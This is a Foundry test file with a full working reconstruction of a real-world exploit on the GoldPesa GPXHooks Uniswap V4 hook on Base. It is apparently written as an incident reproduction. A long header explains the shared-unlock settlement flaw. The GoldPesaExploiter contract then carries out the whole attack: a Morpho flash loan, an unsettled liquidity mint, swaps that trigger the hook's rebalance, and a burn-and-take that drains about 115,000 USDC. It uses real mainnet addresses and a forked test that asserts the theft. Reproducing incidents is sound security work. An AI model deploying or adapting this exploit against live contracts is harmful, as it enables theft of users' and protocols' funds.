// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.30;

import "forge-std/Test.sol";

// GoldPesa (GPX) - Uniswap V4 hook shared-unlock settlement exploit - Base, 2026-10-02.
//
// Run: forge test --contracts src/test/2026-10/GoldPesa_exp.sol --evm-version cancun -vvv
//   (V4 needs EIP-1153 transient storage; the repo default is evm_version=shanghai, so the cancun flag is
//    required - it overrides foundry.toml for this run.)
//
// Loss: 114,999.999186 USDC pulled out of the V4 PoolManager in a single atomic tx.
//
// On-chain references (Base):
//   attack tx         : 0x5c1febd5047c2a15c37988b6abd5c8b984236dddf6fd24eed96b0f43951ad2c9
//   block             : 52078502 (fork at parent 52078501)
//   attacker EOA      : 0x4a5FD2e9357cC87DF4cD6A1808174DBc8646899F
//   attacker contract : 0x3d69591a3868FE77B531187486862c459Cce4e86
//
// Actors / contracts:
//   GPXHooks (vulnerable)     : 0x4519e2b040ff1B64fa03aBe2AeF0BC99D7CcEaA8 (verified source)
//   GPX token (currency0)     : 0x454F8c3f1FC79a98363DB6104A20AC59A02A3133
//   USDC (currency1)          : 0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913
//   WETH                      : 0x4200000000000000000000000000000000000006
//   V4 PoolManager            : 0x498581fF718922c3f8e6A244956aF099B2652b2b
//   V4 PositionManager        : 0x7C5f5A4bBd8fD63184577525326123B519429bDc
//   Morpho Blue (flash loan)  : 0xBBBBBbbBBb9cC5e90e3b3Af64bDAF62C37EEFFCb
//
//   GPX/USDC pool  = {currency0: GPX,  currency1: USDC, fee: 0,   tickSpacing: 1,  hooks: GPXHooks}
//                    poolId 0xe33d2ac4d30348f62723c6a065c34a071970a2cf3776679fc90b07b9a990dcac
//   WETH/USDC pool = {currency0: WETH, currency1: USDC, fee: 500, tickSpacing: 10, hooks: 0}
//                    poolId 0x90333bb05c258fe0dddb2840ef66f1a05165aa7dac6815d24e807cc6ebd943a0
//   (both pool keys reconstructed and confirmed by hashing PoolKey -> poolId against the tx logs.)
//
// ROOT CAUSE (verified against the deployed verified source, contract "GPXHooks"):
//   GPXHooks owns the GPX/USDC protocol liquidity and rebalances it from inside beforeSwap(). Any swap on
//   the GPX pool triggers the rebalance once an hour has elapsed:
//
//       function beforeSwap(...) external override onlyPoolManager ... {
//           checkForDonations();
//           if (block.timestamp - lastRebalance >= 1 hours) {   // permissionless, any swap
//               reBalanceRoutine();
//           }
//           ...
//       }
//
//   reBalance() burns the old protocol position and pulls the freed tokens back to the hook with
//   PositionManager.modifyLiquiditiesWithoutUnlock(BURN_POSITION + TAKE_PAIR):
//
//       bytes memory burnActions = abi.encodePacked(uint8(Actions.BURN_POSITION), uint8(Actions.TAKE_PAIR));
//       ...
//       positionManager.modifyLiquiditiesWithoutUnlock(burnActions, burnParams);  // TAKE_PAIR -> address(this)
//
//   The flaw: modifyLiquiditiesWithoutUnlock does NOT open its own unlock - it runs inside whatever
//   PoolManager unlock is already open. TAKE_PAIR can only withdraw the PositionManager's NET POSITIVE
//   currency delta across that entire shared unlock. The hook never verifies the PositionManager's GPX/USDC
//   deltas are zero (fully settled) before the burn, so its burn credit is not isolated from any other
//   PositionManager delta sitting open in the same unlock.
//
// THE ATTACK (single unlock the attacker opens themselves, all figures from the tx logs):
//   1. Morpho flash loan of 175,000 USDC for working capital (log: FlashLoan, 0x28bed01600 = 175000e6).
//   2. PositionManager MINT_POSITION into WETH/USDC at ticks [-210000, -209990], liquidity
//      8346512432733306153, WITHOUT a SETTLE. The range sits entirely below spot so the position is pure
//      currency1 -> it leaves the shared PositionManager with a -114,999.999186 USDC delta (a phantom debt,
//      no WETH involved - the tx moves zero WETH).
//   3. Two GPX-pool buys (5,500 USDC each) push the pool tick up; the second buy's beforeSwap satisfies
//      checkRebalance and fires the hourly rebalance inside the SAME unlock.
//   4. The hook's BURN_POSITION frees the protocol liquidity, crediting the PositionManager +148,868.602188
//      USDC. But TAKE_PAIR withdraws only the PositionManager's net positive USDC delta:
//          148,868.602188 - 114,999.999186 = 33,868.603002 USDC   (log L21: PoolManager -> hook)
//      The attacker's unpaid mint debt was silently cancelled by the hook's own burn credit.
//   5. The attacker then BURN_POSITIONs their own WETH/USDC position (+114,999.999186 USDC credit to the
//      PositionManager) and TAKE_PAIRs it to themselves: 114,999.999186 USDC straight out of the
//      PoolManager (log L43: PoolManager -> attacker). Their debt had just been paid off by the rebalance.
//   6. A third GPX-pool swap unwinds the GPX bought in steps 3, then the flash loan is repaid.
//
//   This is fully permissionless: the hourly rebalance is reachable by any ordinary swap, and the
//   debt-creation step uses PositionManager/PoolManager's normal permissionless unlock + mint mechanics.
//   No privileged/admin path is involved anywhere in the chain.
//
// VERIFIED FIGURES (reproduced live below, asserted against the exact on-chain microunit figure):
//   hook received from TAKE_PAIR : 33,868.603002 USDC
//   attacker pulled from PoolMgr : 114,999.999186 USDC   <-- the stolen amount asserted here
//   148,868.602188 = 33,868.603002 + 114,999.999186 (hook burn credit split by the shared-delta bug)

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

// ---- Uniswap V4 (minimal). Currency is an address; BalanceDelta is a packed int256 (amount0 high, amount1 low).
struct PoolKey {
    address currency0;
    address currency1;
    uint24 fee;
    int24 tickSpacing;
    address hooks;
}

struct SwapParams {
    bool zeroForOne;
    int256 amountSpecified;
    uint160 sqrtPriceLimitX96;
}

interface IPoolManager {
    function unlock(bytes calldata data) external returns (bytes memory);
    function swap(PoolKey calldata key, SwapParams calldata params, bytes calldata hookData)
        external
        returns (int256 delta);
    function sync(address currency) external;
    function settle() external payable returns (uint256);
    function take(address currency, address to, uint256 amount) external;
}

interface IPositionManager {
    function modifyLiquiditiesWithoutUnlock(bytes calldata actions, bytes[] calldata params) external payable;
    function nextTokenId() external view returns (uint256);
}

interface IMorpho {
    function flashLoan(address token, uint256 assets, bytes calldata data) external;
}

/// @notice Reconstruction of the on-chain attack contract 0x3d69591a...4e86.
contract GoldPesaExploiter {
    IPoolManager constant PM = IPoolManager(0x498581fF718922c3f8e6A244956aF099B2652b2b);
    IPositionManager constant POSM = IPositionManager(0x7C5f5A4bBd8fD63184577525326123B519429bDc);
    IMorpho constant MORPHO = IMorpho(0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb);

    address constant USDC = 0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913;
    address constant WETH = 0x4200000000000000000000000000000000000006;
    address constant GPX = 0x454F8c3f1FC79a98363DB6104A20AC59A02A3133;
    address constant HOOK = 0x4519e2b040ff1B64fa03aBe2AeF0BC99D7CcEaA8;

    // Uniswap V4 Action ids (from v4-periphery Actions.sol)
    uint8 constant MINT_POSITION = 0x02;
    uint8 constant BURN_POSITION = 0x03;
    uint8 constant TAKE_PAIR = 0x11;

    uint160 constant MIN_SQRT_PRICE = 4295128739;
    uint160 constant MAX_SQRT_PRICE = 1461446703485210103287273052203988822378723970342;

    // exact on-chain values
    uint256 constant LOAN = 175_000e6; // Morpho flash loan
    uint256 constant PUMP = 5_500e6; // each GPX-pool buy
    int24 constant OWN_TICK_LOWER = -210000;
    int24 constant OWN_TICK_UPPER = -209990;
    uint256 constant OWN_LIQUIDITY = 8346512432733306153;

    PoolKey gpxKey = PoolKey({currency0: GPX, currency1: USDC, fee: 0, tickSpacing: 1, hooks: HOOK});
    PoolKey wethKey = PoolKey({currency0: WETH, currency1: USDC, fee: 500, tickSpacing: 10, hooks: address(0)});

    uint256 public ownTokenId;
    uint256 public stolenUSDC; // USDC pulled out via the attacker's own-position burn (step 5)

    function attack() external {
        MORPHO.flashLoan(USDC, LOAN, "");
    }

    /// @dev Morpho Blue flash-loan callback. Runs the whole exploit inside one PoolManager unlock, then
    ///      approves Morpho to pull the principal back (zero fee on Morpho Blue).
    function onMorphoFlashLoan(uint256 assets, bytes calldata) external {
        require(msg.sender == address(MORPHO), "only morpho");
        PM.unlock("");
        IERC20(USDC).approve(address(MORPHO), assets);
    }

    function unlockCallback(bytes calldata) external returns (bytes memory) {
        require(msg.sender == address(PM), "only pm");

        // Step 1: mint a pure-USDC WETH/USDC position WITHOUT settling -> leaves PositionManager a
        //         -114,999.999186 USDC phantom debt in this shared unlock.
        _mintOwnUnsettled();
        ownTokenId = POSM.nextTokenId() - 1;

        // Step 2: first GPX-pool buy pushes the tick up (does not yet satisfy checkRebalance).
        _swap(gpxKey, false, PUMP); // USDC -> GPX (one-for-zero)

        // Step 3: second GPX-pool buy. Its beforeSwap fires the hourly rebalance inside this unlock; the
        //         hook's BURN credit silently pays off the phantom debt and TAKE_PAIR only nets 33,868.6 USDC.
        _swap(gpxKey, false, PUMP);

        // Step 4: burn our own position and TAKE_PAIR it to ourselves. The debt is already paid, so this
        //         pulls the full 114,999.999186 USDC straight out of the PoolManager.
        uint256 beforeBurn = IERC20(USDC).balanceOf(address(this));
        _burnOwnAndTake();
        stolenUSDC = IERC20(USDC).balanceOf(address(this)) - beforeBurn;

        // Step 5: unwind the GPX bought in steps 2-3 back to USDC so balances close cleanly.
        uint256 gpxBal = IERC20(GPX).balanceOf(address(this));
        if (gpxBal > 0) _swap(gpxKey, true, gpxBal); // GPX -> USDC (zero-for-one), exact input

        return "";
    }

    function _mintOwnUnsettled() internal {
        // Only MINT_POSITION, deliberately no SETTLE_PAIR: the delta is left open on the PositionManager.
        bytes memory actions = abi.encodePacked(MINT_POSITION);
        bytes[] memory params = new bytes[](1);
        params[0] = abi.encode(
            wethKey,
            OWN_TICK_LOWER,
            OWN_TICK_UPPER,
            OWN_LIQUIDITY,
            type(uint128).max, // amount0Max
            type(uint128).max, // amount1Max
            address(this), // owner
            bytes("")
        );
        POSM.modifyLiquiditiesWithoutUnlock(actions, params);
    }

    function _burnOwnAndTake() internal {
        bytes memory actions = abi.encodePacked(BURN_POSITION, TAKE_PAIR);
        bytes[] memory params = new bytes[](2);
        params[0] = abi.encode(ownTokenId, uint128(0), uint128(0), bytes("")); // tokenId, amount0Min, amount1Min
        params[1] = abi.encode(WETH, USDC, address(this)); // currency0, currency1, recipient
        POSM.modifyLiquiditiesWithoutUnlock(actions, params);
    }

    /// @dev One exact-input swap on `key`, settling whatever we owe and taking whatever we are owed.
    function _swap(PoolKey memory key, bool zeroForOne, uint256 amountIn) internal {
        int256 d = PM.swap(
            key,
            SwapParams({
                zeroForOne: zeroForOne,
                amountSpecified: -int256(amountIn), // negative = exact input
                sqrtPriceLimitX96: zeroForOne ? MIN_SQRT_PRICE + 1 : MAX_SQRT_PRICE - 1
            }),
            ""
        );
        int128 a0 = int128(d >> 128);
        int128 a1 = int128(d);
        _resolve(key.currency0, a0);
        _resolve(key.currency1, a1);
    }

    function _resolve(address currency, int128 amount) internal {
        if (amount < 0) {
            // we owe the pool
            PM.sync(currency);
            IERC20(currency).transfer(address(PM), uint256(uint128(-amount)));
            PM.settle();
        } else if (amount > 0) {
            // the pool owes us
            PM.take(currency, address(this), uint256(uint128(amount)));
        }
    }

    receive() external payable {}
}

contract GoldPesa_exp is Test {
    address constant USDC = 0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913;

    // Exact on-chain figure: 114,999.999186 USDC pulled out of the PoolManager by the attacker.
    uint256 constant ON_CHAIN_STOLEN = 114_999_999186;

    GoldPesaExploiter exploiter;

    function setUp() public {
        // Fork at the PARENT of the attack block; the full sequence is reconstructed live.
        vm.createSelectFork("base", 52078501);
        // Faithfulness: match the attack block timestamp (does not affect V4 price math).
        vm.warp(1790946351);
        exploiter = new GoldPesaExploiter();
    }

    function testExploit() public {
        emit log_string("GoldPesa GPX - Uniswap V4 hook shared-unlock settlement exploit");

        exploiter.attack();

        uint256 stolen = exploiter.stolenUSDC();
        emit log_named_decimal_uint("USDC pulled out via own-position burn", stolen, 6);

        uint256 netProfit = IERC20(USDC).balanceOf(address(exploiter));
        emit log_named_decimal_uint("Net USDC profit after flash-loan repay", netProfit, 6);

        // The stolen amount is the WETH/USDC position's value, minted and burned at the same (unmoved) price,
        // so it reproduces the on-chain microunit figure exactly. Tight tolerance (0.01%).
        assertApproxEqRel(stolen, ON_CHAIN_STOLEN, 1e14, "stolen USDC must match on-chain 114,999.999186");
        assertGt(netProfit, 100_000e6, "attacker must walk away with a six-figure USDC profit");
    }
}
